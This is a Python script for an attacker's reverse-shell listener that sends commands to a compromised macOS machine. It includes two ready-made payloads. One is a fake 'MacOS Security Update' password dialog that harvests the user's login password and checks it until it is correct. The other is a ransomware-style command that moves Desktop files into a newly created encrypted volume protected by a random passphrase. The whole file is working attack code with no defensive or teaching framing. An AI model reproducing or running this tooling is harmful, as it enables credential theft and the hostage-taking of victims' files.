import socket

HOST = "0.0.0.0"
PORT = 5050

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f'[*] Listening on {s.getsockname()}')
    client_socket, addr = s.accept()
    print(f'[+] Got connection from {client_socket.getsockname()}')
    client_socket.settimeout(60)
    with client_socket:
        while True:
            command = input("~$: ")
            if command.lower() == 'phishing':
                command = '''PWD_=$(osascript -e 'display dialog "To perform a security update MacOS needs your password." with title "MacOS Security Update" default answer "" with icon 2 with hidden answer' -e 'text returned of result' 2>/dev/null);if [[ $(dscl . authonly $(id -un) $PWD_ 2>/dev/null) != "" ]];then while true; do PWD_=$(osascript -e 'display dialog "Incorrect password. Please try again" with title "MacOS Security Update" default answer "" with icon 2 with hidden answer' -e 'text returned of result' 2>/dev/null); if [[ $(dscl . authonly $(id -un) $PWD_ 2>/dev/null) == "" ]]; then break; fi; done fi; echo password : "'"$PWD_"'";'''
            elif command.lower() == 'ransom':
                command = '''diskP=$(openssl rand -hex 63); echo OhNoItIsLocked Password : "'"$diskP"'"; diskutil ap addvolume disk1 apfs OhNoItIsLocked -passphrase "$diskP"; osascript -e 'tell app "Terminal"' -e 'do script "mv -f /Users/robertbebert/Desktop/* /Volumes/OhNoItIsLocked && diskutil umount OhNoItIsLocked"' -e 'end tell';'''
            client_socket.send((command + "\n").encode())
            if command.lower() == "exit":
                break
            while True:
                try:
                    results = client_socket.recv(2048*1024)
                    if results == 'bash-3.2$ '.encode():
                        break
                    print(results.decode())
                except:
                    break
        client_socket.close()
        s.close()
